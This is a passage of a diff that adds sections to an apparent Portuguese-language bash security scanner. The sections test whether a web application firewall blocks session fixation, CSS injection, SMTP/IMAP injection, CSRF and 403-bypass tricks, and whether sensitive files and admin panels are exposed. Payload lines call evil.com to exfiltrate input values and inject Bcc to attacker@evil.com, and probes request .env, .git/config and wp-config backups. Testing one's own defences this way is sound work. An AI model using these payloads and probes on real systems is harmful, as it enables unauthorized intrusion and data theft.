+            FAILED_TESTS=$((FAILED_TESTS + 1))
+            [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $header_name presente - $header_desc" >> "$OUTPUT_FILE"
+            if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+                echo -e "  ${RED}[✗]${NC} $header_name: ${RED}PRESENTE${NC} - $header_desc"
+                echo -e "      ${YELLOW}→ Valor: $(echo "$header_found" | cut -d':' -f2-)${NC}"
+            fi
+        else
+            PASSED_TESTS=$((PASSED_TESTS + 1))
+            [ -n "$OUTPUT_FILE" ] && echo "[PASS] $header_name: Corretamente removido" >> "$OUTPUT_FILE"
+            if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                echo -e "  ${GREEN}[✓]${NC} $header_name: ${GREEN}Corretamente removido${NC}"
+            fi
+        fi
+    done
+    
+    echo ""
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${BOLD}💡 Configuração Nginx Recomendada:${NC}"
+    echo -e "  ${YELLOW}add_header X-Content-Type-Options \"nosniff\" always;${NC}"
+    echo -e "  ${YELLOW}add_header X-Frame-Options \"DENY\" always;${NC}"
+    echo -e "  ${YELLOW}add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;${NC}"
+    echo -e "  ${YELLOW}add_header Permissions-Policy \"geolocation=(), microphone=(), camera=()\" always;${NC}"
+    echo -e "  ${YELLOW}server_tokens off;${NC}"
+    echo -e "  ${YELLOW}more_clear_headers Server;${NC}"
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+#==============================================================================
+# SESSION SECURITY (Cookies Flags - HttpOnly, Secure, SameSite)
+#==============================================================================
+test_session_security() {
+    print_section "🍪 TESTES DE SEGURANÇA DE SESSÃO (Cookies)"
+    
+    echo -e "  ${YELLOW}ℹ️  Verificando flags de segurança em cookies${NC}"
+    echo -e "  ${YELLOW}   Cookies devem ter: HttpOnly, Secure, SameSite${NC}"
+    echo ""
+    
+    # Obter headers da resposta (incluindo cookies)
+    local headers
+    headers=$(curl -sI -A "$UA" -Lk "$URL" 2>/dev/null)
+    
+    # Extrair todos os Set-Cookie headers
+    local cookies
+    cookies=$(echo "$headers" | grep -i "^Set-Cookie:")
+    
+    if [ -z "$cookies" ]; then
+        echo -e "  ${YELLOW}[?]${NC} Nenhum cookie Set-Cookie encontrado na resposta inicial"
+        echo -e "  ${YELLOW}   Testando em página de login...${NC}"
+        
+        # Tentar obter cookies de páginas comuns
+        for login_path in "/wp-login.php" "/admin" "/login" "/user/login" "/auth/login"; do
+            local login_headers
+            login_headers=$(curl -sI -A "$UA" -Lk "${URL}${login_path}" 2>/dev/null)
+            local login_cookies
+            login_cookies=$(echo "$login_headers" | grep -i "^Set-Cookie:")
+            if [ -n "$login_cookies" ]; then
+                cookies="$login_cookies"
+                echo -e "  ${GREEN}   Cookies encontrados em ${login_path}${NC}"
+                break
+            fi
+        done
+    fi
+    
+    if [ -z "$cookies" ]; then
+        echo -e "  ${YELLOW}[!]${NC} Nenhum cookie encontrado para análise"
+        return
+    fi
+    
+    print_subsection "Análise de Cookies"
+    
+    echo "$cookies" | while read -r cookie_line; do
+        local cookie_name
+        cookie_name=$(echo "$cookie_line" | sed 's/^Set-Cookie: *//i' | cut -d'=' -f1)
+        
+        echo ""
+        echo -e "  ${CYAN}Cookie: ${BOLD}$cookie_name${NC}"
+        
+        # Verificar HttpOnly
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        if echo "$cookie_line" | grep -qi "HttpOnly"; then
+            PASSED_TESTS=$((PASSED_TESTS + 1))
+            echo -e "    ${GREEN}[✓]${NC} HttpOnly: ${GREEN}Presente${NC}"
+        else
+            FAILED_TESTS=$((FAILED_TESTS + 1))
+            echo -e "    ${RED}[✗]${NC} HttpOnly: ${RED}AUSENTE${NC} - Cookie acessível via JavaScript!"
+        fi
+        
+        # Verificar Secure
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        if echo "$cookie_line" | grep -qi "Secure"; then
+            PASSED_TESTS=$((PASSED_TESTS + 1))
+            echo -e "    ${GREEN}[✓]${NC} Secure: ${GREEN}Presente${NC}"
+        else
+            FAILED_TESTS=$((FAILED_TESTS + 1))
+            echo -e "    ${RED}[✗]${NC} Secure: ${RED}AUSENTE${NC} - Cookie enviado em conexões HTTP!"
+        fi
+        
+        # Verificar SameSite
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        if echo "$cookie_line" | grep -qi "SameSite"; then
+            local samesite_value
+            samesite_value=$(echo "$cookie_line" | grep -oP "SameSite=\K[^;]+" | tr -d ' ')
+            if [[ "${samesite_value^^}" == "STRICT" ]] || [[ "${samesite_value^^}" == "LAX" ]]; then
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+                echo -e "    ${GREEN}[✓]${NC} SameSite: ${GREEN}$samesite_value${NC}"
+            else
+                FAILED_TESTS=$((FAILED_TESTS + 1))
+                echo -e "    ${YELLOW}[!]${NC} SameSite: ${YELLOW}$samesite_value${NC} (considere Strict ou Lax)"
+            fi
+        else
+            FAILED_TESTS=$((FAILED_TESTS + 1))
+            echo -e "    ${RED}[✗]${NC} SameSite: ${RED}AUSENTE${NC} - Vulnerável a CSRF!"
+        fi
+        
+        # Verificar Path
+        if echo "$cookie_line" | grep -qi "Path="; then
+            local path_value
+            path_value=$(echo "$cookie_line" | grep -oP "Path=\K[^;]+" | tr -d ' ')
+            echo -e "    ${CYAN}[i]${NC} Path: $path_value"
+        fi
+        
+        # Verificar Domain
+        if echo "$cookie_line" | grep -qi "Domain="; then
+            local domain_value
+            domain_value=$(echo "$cookie_line" | grep -oP "Domain=\K[^;]+" | tr -d ' ')
+            echo -e "    ${CYAN}[i]${NC} Domain: $domain_value"
+        fi
+    done
+    
+    print_subsection "Testes de Session Fixation"
+    test_curl "Session: Cookie injetado" "block" -A "$UA" -Lk --cookie "PHPSESSID=fixedsession123" "$URL"
+    test_curl "Session: Cookie JSESSIONID" "block" -A "$UA" -Lk --cookie "JSESSIONID=fixedsession123" "$URL"
+    test_curl "Session: WordPress cookie" "block" -A "$UA" -Lk --cookie "wordpress_logged_in=admin" "$URL"
+    
+    echo ""
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${BOLD}💡 Configuração PHP Recomendada (php.ini):${NC}"
+    echo -e "  ${YELLOW}session.cookie_httponly = On${NC}"
+    echo -e "  ${YELLOW}session.cookie_secure = On${NC}"
+    echo -e "  ${YELLOW}session.cookie_samesite = Strict${NC}"
+    echo -e "  ${YELLOW}session.use_strict_mode = On${NC}"
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+#==============================================================================
+# CSS INJECTION TESTS
+#==============================================================================
+test_css_injection() {
+    print_section "🎨 TESTES DE CSS INJECTION"
+    
+    print_subsection "CSS Injection em Parâmetros"
+    test_curl "CSS: expression()" "block" -A "$UA" -Lk "${URL}?style=expression(alert(1))"
+    test_curl "CSS: url() data" "block" -A "$UA" -Lk "${URL}?css=background:url(data:text/html,<script>alert(1)</script>)"
+    test_curl "CSS: import" "block" -A "$UA" -Lk "${URL}?style=@import'http://evil.com/evil.css'"
+    test_curl "CSS: behavior" "block" -A "$UA" -Lk "${URL}?css=behavior:url(script.htc)"
+    test_curl "CSS: moz-binding" "block" -A "$UA" -Lk "${URL}?css=-moz-binding:url(http://evil.com/xss.xml)"
+    test_curl "CSS: charset trick" "block" -A "$UA" -Lk "${URL}?css=@charset\"UTF-7\";+ADw-script+AD4-alert(1)+ADw-/script+AD4-"
+    
+    print_subsection "CSS Injection em Headers"
+    test_curl "CSS: Style header" "block" -A "$UA" -Lk -H "X-Custom-CSS: expression(alert(1))" "$URL"
+    test_curl "CSS: Content-Style-Type" "block" -A "$UA" -Lk -H "Content-Style-Type: text/css; expression(alert(1))" "$URL"
+    
+    print_subsection "CSS Exfiltration Payloads"
+    test_curl "CSS: attribute selector exfil" "block" -A "$UA" -Lk "${URL}?css=input[value^='a']{background:url(http://evil.com/?a)}"
+    test_curl "CSS: font-face exfil" "block" -A "$UA" -Lk "${URL}?css=@font-face{src:url(http://evil.com/exfil)}"
+    
+    print_subsection "CSS Keylogger Payloads"
+    test_curl "CSS: input keylogger" "block" -A "$UA" -Lk "${URL}?css=input[value\$='password']{background:url(http://evil.com/log)}"
+}
+
+#==============================================================================
+# EMAIL INJECTION (IMAP/SMTP Injection)
+#==============================================================================
+test_email_injection() {
+    print_section "📧 TESTES DE EMAIL INJECTION (IMAP/SMTP)"
+    
+    print_subsection "SMTP Header Injection"
+    test_curl "SMTP: Bcc injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0ABcc:attacker@evil.com" "$URL"
+    test_curl "SMTP: Cc injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0ACc:attacker@evil.com" "$URL"
+    test_curl "SMTP: To injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0ATo:attacker@evil.com" "$URL"
+    test_curl "SMTP: Subject injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0ASubject:SPAM" "$URL"
+    test_curl "SMTP: Content-Type injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0AContent-Type:text/html" "$URL"
+    test_curl "SMTP: CRLF newline" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0D%0ABcc:attacker@evil.com" "$URL"
+    
+    print_subsection "IMAP Injection"
+    test_curl "IMAP: Command injection" "block" -A "$UA" -Lk "${URL}?mailbox=INBOX%0ASELECT+OUTBOX"
+    test_curl "IMAP: Search injection" "block" -A "$UA" -Lk "${URL}?search=FROM+admin%0ADELETE+1:*"
+    test_curl "IMAP: Fetch injection" "block" -A "$UA" -Lk "${URL}?msg=1%0AFETCH+1:*+BODY[]"
+    
+    print_subsection "Email em Parâmetros"
+    test_curl "Email: Multiple recipients" "block" -A "$UA" -Lk "${URL}?to=victim@test.com,attacker@evil.com"
+    test_curl "Email: Header in From" "block" -A "$UA" -Lk "${URL}?from=attacker@evil.com%0AReply-To:admin@target.com"
+    test_curl "Email: Null byte" "block" -A "$UA" -Lk "${URL}?email=test@test.com%00.evil.com"
+}
+
+#==============================================================================
+# DEFAULT CREDENTIALS CHECK
+#==============================================================================
+test_default_credentials() {
+    print_section "🔑 TESTES DE CREDENCIAIS PADRÃO / PAINÉIS ADMIN"
+    
+    echo -e "  ${YELLOW}ℹ️  Verificando acessibilidade de painéis admin e endpoints sensíveis${NC}"
+    echo -e "  ${YELLOW}   Esses endpoints devem retornar 403/404 ou redirecionar para login${NC}"
+    echo ""
+    
+    print_subsection "Painéis Admin Genéricos"
+    test_curl "Admin: /admin" "block" -A "$UA" -Lk "${URL}/admin"
+    test_curl "Admin: /admin/" "block" -A "$UA" -Lk "${URL}/admin/"
+    test_curl "Admin: /administrator" "block" -A "$UA" -Lk "${URL}/administrator"
+    test_curl "Admin: /admin.php" "block" -A "$UA" -Lk "${URL}/admin.php"
+    test_curl "Admin: /adminpanel" "block" -A "$UA" -Lk "${URL}/adminpanel"
+    test_curl "Admin: /cpanel" "block" -A "$UA" -Lk "${URL}/cpanel"
+    test_curl "Admin: /dashboard" "block" -A "$UA" -Lk "${URL}/dashboard"
+    test_curl "Admin: /manage" "block" -A "$UA" -Lk "${URL}/manage"
+    test_curl "Admin: /manager" "block" -A "$UA" -Lk "${URL}/manager"
+    test_curl "Admin: /controlpanel" "block" -A "$UA" -Lk "${URL}/controlpanel"
+    
+    print_subsection "WordPress Específico"
+    test_curl "WP: /wp-admin" "block" -A "$UA" -Lk "${URL}/wp-admin"
+    test_curl "WP: /wp-login.php" "block" -A "$UA" -Lk "${URL}/wp-login.php"
+    test_curl "WP: /xmlrpc.php" "block" -A "$UA" -Lk "${URL}/xmlrpc.php"
+    test_curl "WP: /wp-config.php.bak" "block" -A "$UA" -Lk "${URL}/wp-config.php.bak"
+    test_curl "WP: /wp-config.php~" "block" -A "$UA" -Lk "${URL}/wp-config.php~"
+    test_curl "WP: /wp-config.php.save" "block" -A "$UA" -Lk "${URL}/wp-config.php.save"
+    test_curl "WP: /wp-content/debug.log" "block" -A "$UA" -Lk "${URL}/wp-content/debug.log"
+    test_curl "WP: /wp-json/wp/v2/users" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users"
+    
+    print_subsection "Database Admin"
+    test_curl "DB: /phpmyadmin" "block" -A "$UA" -Lk "${URL}/phpmyadmin"
+    test_curl "DB: /phpMyAdmin" "block" -A "$UA" -Lk "${URL}/phpMyAdmin"
+    test_curl "DB: /pma" "block" -A "$UA" -Lk "${URL}/pma"
+    test_curl "DB: /mysql" "block" -A "$UA" -Lk "${URL}/mysql"
+    test_curl "DB: /adminer" "block" -A "$UA" -Lk "${URL}/adminer"
+    test_curl "DB: /adminer.php" "block" -A "$UA" -Lk "${URL}/adminer.php"
+    
+    print_subsection "Arquivos Sensíveis"
+    test_curl "Sensível: /.env" "block" -A "$UA" -Lk "${URL}/.env"
+    test_curl "Sensível: /.git/config" "block" -A "$UA" -Lk "${URL}/.git/config"
+    test_curl "Sensível: /.git/HEAD" "block" -A "$UA" -Lk "${URL}/.git/HEAD"
+    test_curl "Sensível: /.svn/wc.db" "block" -A "$UA" -Lk "${URL}/.svn/wc.db"
+    test_curl "Sensível: /config.php" "block" -A "$UA" -Lk "${URL}/config.php"
+    test_curl "Sensível: /configuration.php" "block" -A "$UA" -Lk "${URL}/configuration.php"
+    test_curl "Sensível: /settings.php" "block" -A "$UA" -Lk "${URL}/settings.php"
+    test_curl "Sensível: /database.yml" "block" -A "$UA" -Lk "${URL}/database.yml"
+    test_curl "Sensível: /config.yml" "block" -A "$UA" -Lk "${URL}/config.yml"
+    test_curl "Sensível: /credentials.json" "block" -A "$UA" -Lk "${URL}/credentials.json"
+    test_curl "Sensível: /secrets.json" "block" -A "$UA" -Lk "${URL}/secrets.json"
+    test_curl "Sensível: /.htpasswd" "block" -A "$UA" -Lk "${URL}/.htpasswd"
+    test_curl "Sensível: /.htaccess" "block" -A "$UA" -Lk "${URL}/.htaccess"
+    test_curl "Sensível: /server-status" "block" -A "$UA" -Lk "${URL}/server-status"
+    test_curl "Sensível: /server-info" "block" -A "$UA" -Lk "${URL}/server-info"
+    test_curl "Sensível: /info.php" "block" -A "$UA" -Lk "${URL}/info.php"
+    test_curl "Sensível: /phpinfo.php" "block" -A "$UA" -Lk "${URL}/phpinfo.php"
+    test_curl "Sensível: /test.php" "block" -A "$UA" -Lk "${URL}/test.php"
+    
+    print_subsection "Backup Files"
+    test_curl "Backup: .bak" "block" -A "$UA" -Lk "${URL}/index.php.bak"
+    test_curl "Backup: .old" "block" -A "$UA" -Lk "${URL}/index.php.old"
+    test_curl "Backup: .backup" "block" -A "$UA" -Lk "${URL}/backup.sql"
+    test_curl "Backup: .sql" "block" -A "$UA" -Lk "${URL}/database.sql"
+    test_curl "Backup: .zip" "block" -A "$UA" -Lk "${URL}/backup.zip"
+    test_curl "Backup: .tar.gz" "block" -A "$UA" -Lk "${URL}/backup.tar.gz"
+    test_curl "Backup: dump.sql" "block" -A "$UA" -Lk "${URL}/dump.sql"
+    
+    print_subsection "API Endpoints"
+    test_curl "API: /api" "block" -A "$UA" -Lk "${URL}/api"
+    test_curl "API: /api/v1" "block" -A "$UA" -Lk "${URL}/api/v1"
+    test_curl "API: /api/users" "block" -A "$UA" -Lk "${URL}/api/users"
+    test_curl "API: /api/admin" "block" -A "$UA" -Lk "${URL}/api/admin"
+    test_curl "API: /graphql" "block" -A "$UA" -Lk "${URL}/graphql"
+    test_curl "API: /swagger" "block" -A "$UA" -Lk "${URL}/swagger"
+    test_curl "API: /swagger-ui" "block" -A "$UA" -Lk "${URL}/swagger-ui"
+    test_curl "API: /api-docs" "block" -A "$UA" -Lk "${URL}/api-docs"
+    test_curl "API: /openapi.json" "block" -A "$UA" -Lk "${URL}/openapi.json"
+}
+
+#==============================================================================
+# ACCOUNT ENUMERATION TESTS
+#==============================================================================
+test_account_enumeration() {
+    print_section "👤 TESTES DE ENUMERAÇÃO DE CONTAS"
+    
+    echo -e "  ${YELLOW}ℹ️  Verificando se respostas diferentes revelam existência de usuários${NC}"
+    echo ""
+    
+    print_subsection "WordPress User Enumeration"
+    test_curl "WP Enum: ?author=1" "block" -A "$UA" -Lk "${URL}/?author=1"
+    test_curl "WP Enum: ?author=2" "block" -A "$UA" -Lk "${URL}/?author=2"
+    test_curl "WP Enum: ?author=3" "block" -A "$UA" -Lk "${URL}/?author=3"
+    test_curl "WP Enum: REST API users" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users"
+    test_curl "WP Enum: oembed author" "block" -A "$UA" -Lk "${URL}/wp-json/oembed/1.0/embed?url=${URL}"
+    
+    print_subsection "Login Enumeration (diferença de resposta)"
+    # Testar com credenciais que provavelmente não existem
+    test_curl "Login: admin/wrongpass" "allow" -A "$UA" -Lk -X POST -d "username=admin&password=wrongpassword123" "${URL}/wp-login.php"
+    test_curl "Login: nonexistent/wrongpass" "allow" -A "$UA" -Lk -X POST -d "username=nonexistent_user_xyz123&password=wrongpassword123" "${URL}/wp-login.php"
+    
+    print_subsection "Email Enumeration"
+    test_curl "Email: forgot password existing" "allow" -A "$UA" -Lk -X POST -d "email=admin@localhost" "${URL}/wp-login.php?action=lostpassword"
+    test_curl "Email: forgot password nonexistent" "allow" -A "$UA" -Lk -X POST -d "email=nonexistent_xyz123@invalid.local" "${URL}/wp-login.php?action=lostpassword"
+    
+    echo ""
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${BOLD}💡 Proteção contra Enumeração:${NC}"
+    echo -e "  ${YELLOW}• WordPress:${NC} Usar plugin como 'Stop User Enumeration'"
+    echo -e "  ${YELLOW}• Login:${NC} Mesma mensagem para usuário inexistente e senha errada"
+    echo -e "  ${YELLOW}• API:${NC} Desabilitar /wp-json/wp/v2/users ou requerer autenticação"
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+#==============================================================================
+# FORMAT STRING INJECTION
+#==============================================================================
+test_format_string() {
+    print_section "📝 TESTES DE FORMAT STRING INJECTION"
+    
+    print_subsection "Format String em Parâmetros"
+    test_curl "Format: %s" "block" -A "$UA" -Lk "${URL}?input=%s%s%s%s%s"
+    test_curl "Format: %x" "block" -A "$UA" -Lk "${URL}?input=%x%x%x%x%x"
+    test_curl "Format: %n" "block" -A "$UA" -Lk "${URL}?input=%n%n%n%n%n"
+    test_curl "Format: %d" "block" -A "$UA" -Lk "${URL}?input=%d%d%d%d%d"
+    test_curl "Format: %p" "block" -A "$UA" -Lk "${URL}?input=%p%p%p%p%p"
+    test_curl "Format: mixed" "block" -A "$UA" -Lk "${URL}?input=%08x.%08x.%08x.%08x"
+    test_curl "Format: direct param" "block" -A "$UA" -Lk "${URL}?input=%1\$s%2\$s%3\$s"
+    test_curl "Format: width spec" "block" -A "$UA" -Lk "${URL}?input=%400d"
+    test_curl "Format: precision" "block" -A "$UA" -Lk "${URL}?input=%.5000d"
+    
+    print_subsection "Format String em Headers"
+    test_curl "Format: User-Agent %s" "block" -A "%s%s%s%s%s" -Lk "$URL"
+    test_curl "Format: Referer %x" "block" -A "$UA" -Lk -H "Referer: %x%x%x%x" "$URL"
+    test_curl "Format: Cookie %n" "block" -A "$UA" -Lk --cookie "data=%n%n%n" "$URL"
+}
+
+#==============================================================================
+# CSRF PROTECTION CHECK
+#==============================================================================
+test_csrf_protection() {
+    print_section "🛡️ TESTES DE PROTEÇÃO CSRF"
+    
+    echo -e "  ${YELLOW}ℹ️  Verificando proteções contra Cross-Site Request Forgery${NC}"
+    echo ""
+    
+    print_subsection "Requisições POST sem Token CSRF"
+    test_curl "CSRF: POST sem token" "block" -A "$UA" -Lk -X POST -d "action=delete&id=1" "$URL"
+    test_curl "CSRF: POST formulário fake" "block" -A "$UA" -Lk -X POST -d "email=test@test.com&password=test123" "${URL}/wp-login.php"
+    test_curl "CSRF: POST com Referer externo" "block" -A "$UA" -Lk -X POST -H "Referer: http://evil.com" -d "action=update" "$URL"
+    test_curl "CSRF: POST sem Referer" "block" -A "$UA" -Lk -X POST -H "Referer:" -d "action=update" "$URL"
+    test_curl "CSRF: POST com Origin externo" "block" -A "$UA" -Lk -X POST -H "Origin: http://evil.com" -d "action=update" "$URL"
+    
+    print_subsection "Verificar Headers de Proteção"
+    
+    # Obter headers
+    local headers
+    headers=$(curl -sI -A "$UA" -Lk "$URL" 2>/dev/null)
+    
+    # Verificar SameSite em cookies
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    if echo "$headers" | grep -qi "SameSite"; then
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+        if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+            echo -e "  ${GREEN}[✓]${NC} SameSite cookie attribute: ${GREEN}Presente${NC}"
+        fi
+    else
+        FAILED_TESTS=$((FAILED_TESTS + 1))
+        if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+            echo -e "  ${RED}[✗]${NC} SameSite cookie attribute: ${RED}Ausente${NC}"
+        fi
+    fi
+    
+    print_subsection "Tentativas de Bypass CSRF"
+    test_curl "CSRF Bypass: Content-Type text/plain" "block" -A "$UA" -Lk -X POST -H "Content-Type: text/plain" -d "action=delete" "$URL"
+    test_curl "CSRF Bypass: Content-Type multipart" "block" -A "$UA" -Lk -X POST -H "Content-Type: multipart/form-data" -F "action=delete" "$URL"
+    test_curl "CSRF Bypass: X-Requested-With XMLHttpRequest" "block" -A "$UA" -Lk -X POST -H "X-Requested-With: XMLHttpRequest" -d "action=delete" "$URL"
+    test_curl "CSRF Bypass: JSON Content-Type" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"action":"delete"}' "$URL"
+    
+    echo ""
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${BOLD}💡 Proteção CSRF Recomendada:${NC}"
+    echo -e "  ${YELLOW}• Tokens CSRF:${NC} Usar tokens únicos por sessão/formulário"
+    echo -e "  ${YELLOW}• SameSite Cookie:${NC} Definir SameSite=Strict ou SameSite=Lax"
+    echo -e "  ${YELLOW}• Verificar Referer:${NC} Validar origem das requisições"
+    echo -e "  ${YELLOW}• Double Submit:${NC} Cookie + header/body com mesmo token"
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+#==============================================================================
+# 403 BYPASS TECHNIQUES (Técnicas de Bypass para Erro 403)
+#==============================================================================
+test_403_bypass() {
+    print_section "🔓 TESTES DE 403 BYPASS (100+ testes)"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando técnicas para bypass de restrições 403 Forbidden${NC}"
+    echo -e "  ${YELLOW}   Esses testes devem ser BLOQUEADOS para garantir a segurança${NC}"
+    echo ""
+    
+    print_subsection "Header Bypass - IP Spoofing"
+    test_curl "403: X-Originally-Forwarded-For" "block" -A "$UA" -Lk -H "X-Originally-Forwarded-For: 127.0.0.1" "$URL"
+    test_curl "403: X-Originating-" "block" -A "$UA" -Lk -H "X-Originating-: 127.0.0.1" "$URL"
+    test_curl "403: True-Client-IP" "block" -A "$UA" -Lk -H "True-Client-IP: 127.0.0.1" "$URL"
+    test_curl "403: X-WAP-Profile" "block" -A "$UA" -Lk -H "X-WAP-Profile: 127.0.0.1" "$URL"
+    test_curl "403: CF-Connecting_IP (underscore)" "block" -A "$UA" -Lk -H "CF-Connecting_IP: 127.0.0.1" "$URL"
+    test_curl "403: CF-Connecting-IP (hyphen)" "block" -A "$UA" -Lk -H "CF-Connecting-IP: 127.0.0.1" "$URL"
+    test_curl "403: Destination" "block" -A "$UA" -Lk -H "Destination: 127.0.0.1" "$URL"
+    test_curl "403: Proxy" "block" -A "$UA" -Lk -H "Proxy: 127.0.0.1" "$URL"
+    test_curl "403: X-Custom-IP-Authorization" "block" -A "$UA" -Lk -H "X-Custom-IP-Authorization: 127.0.0.1" "$URL"
+    test_curl "403: Base-Url" "block" -A "$UA" -Lk -H "Base-Url: 127.0.0.1" "$URL"
+    test_curl "403: Http-Url" "block" -A "$UA" -Lk -H "Http-Url: 127.0.0.1" "$URL"
+    test_curl "403: Proxy-Host" "block" -A "$UA" -Lk -H "Proxy-Host: 127.0.0.1" "$URL"
+    test_curl "403: Proxy-Url" "block" -A "$UA" -Lk -H "Proxy-Url: 127.0.0.1" "$URL"
+    test_curl "403: Real-Ip" "block" -A "$UA" -Lk -H "Real-Ip: 127.0.0.1" "$URL"
+    test_curl "403: Redirect" "block" -A "$UA" -Lk -H "Redirect: 127.0.0.1" "$URL"
+    test_curl "403: Referrer" "block" -A "$UA" -Lk -H "Referrer: 127.0.0.1" "$URL"
+    test_curl "403: Request-Uri" "block" -A "$UA" -Lk -H "Request-Uri: 127.0.0.1" "$URL"
+    test_curl "403: Uri" "block" -A "$UA" -Lk -H "Uri: 127.0.0.1" "$URL"
+    test_curl "403: Url" "block" -A "$UA" -Lk -H "Url: 127.0.0.1" "$URL"
+    
+    print_subsection "Header Bypass - Additional XFF Variants"
+    test_curl "403: X-Forward-For (typo)" "block" -A "$UA" -Lk -H "X-Forward-For: 127.0.0.1" "$URL"
+    test_curl "403: X-Forwarded-By" "block" -A "$UA" -Lk -H "X-Forwarded-By: 127.0.0.1" "$URL"
+    test_curl "403: X-Forwarded-For-Original" "block" -A "$UA" -Lk -H "X-Forwarded-For-Original: 127.0.0.1" "$URL"
+    test_curl "403: X-Forwarded-Server" "block" -A "$UA" -Lk -H "X-Forwarded-Server: 127.0.0.1" "$URL"
+    test_curl "403: X-Forwarded (short)" "block" -A "$UA" -Lk -H "X-Forwarded: 127.0.0.1" "$URL"
+    test_curl "403: X-Forwarder-For" "block" -A "$UA" -Lk -H "X-Forwarder-For: 127.0.0.1" "$URL"
+    test_curl "403: X-Http-Destinationurl" "block" -A "$UA" -Lk -H "X-Http-Destinationurl: 127.0.0.1" "$URL"
+    test_curl "403: X-Http-Host-Override" "block" -A "$UA" -Lk -H "X-Http-Host-Override: 127.0.0.1" "$URL"
+    test_curl "403: X-Original-Remote-Addr" "block" -A "$UA" -Lk -H "X-Original-Remote-Addr: 127.0.0.1" "$URL"
+    test_curl "403: X-Proxy-Url" "block" -A "$UA" -Lk -H "X-Proxy-Url: 127.0.0.1" "$URL"
+    test_curl "403: X-Real-Ip" "block" -A "$UA" -Lk -H "X-Real-Ip: 127.0.0.1" "$URL"
+    test_curl "403: X-OReferrer (encoded)" "block" -A "$UA" -Lk -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" "$URL"
+    
+    print_subsection "Header Bypass - Domain/URL Headers"
+    local domain_part
+    domain_part=$(echo "$URL" | sed -E 's|https?://([^/:]+).*|\1|')
+    test_curl "403: Profile http://" "block" -A "$UA" -Lk -H "Profile: http://${domain_part}" "$URL"
+    test_curl "403: X-Arbitrary http://" "block" -A "$UA" -Lk -H "X-Arbitrary: http://${domain_part}" "$URL"
+    test_curl "403: X-HTTP-DestinationURL" "block" -A "$UA" -Lk -H "X-HTTP-DestinationURL: http://${domain_part}" "$URL"
+    test_curl "403: X-Forwarded-Proto http" "block" -A "$UA" -Lk -H "X-Forwarded-Proto: http://${domain_part}" "$URL"
+    test_curl "403: Referer self" "block" -A "$UA" -Lk -H "Referer: ${URL}" "$URL"
+    
+    print_subsection "Port Bypass via X-Forwarded-Port"
+    test_curl "403: X-Forwarded-Port 443" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 443" "$URL"
+    test_curl "403: X-Forwarded-Port 4443" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 4443" "$URL"
+    test_curl "403: X-Forwarded-Port 80" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 80" "$URL"
+    test_curl "403: X-Forwarded-Port 8080" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 8080" "$URL"
+    test_curl "403: X-Forwarded-Port 8443" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 8443" "$URL"
+    
+    print_subsection "Protocol Bypass"
+    test_curl "403: X-Forwarded-Scheme http" "block" -A "$UA" -Lk -H "X-Forwarded-Scheme: http" "$URL"
+    test_curl "403: X-Forwarded-Scheme https" "block" -A "$UA" -Lk -H "X-Forwarded-Scheme: https" "$URL"
+    
+    print_subsection "URL Encode Bypass - Basic"
+    test_curl "403: #?" "block" -A "$UA" -Lk --path-as-is "${URL}#?"
+    test_curl "403: %09 (tab)" "block" -A "$UA" -Lk --path-as-is "${URL}%09"
+    test_curl "403: %09%3b" "block" -A "$UA" -Lk --path-as-is "${URL}%09%3b"
+    test_curl "403: %09.." "block" -A "$UA" -Lk --path-as-is "${URL}%09.."
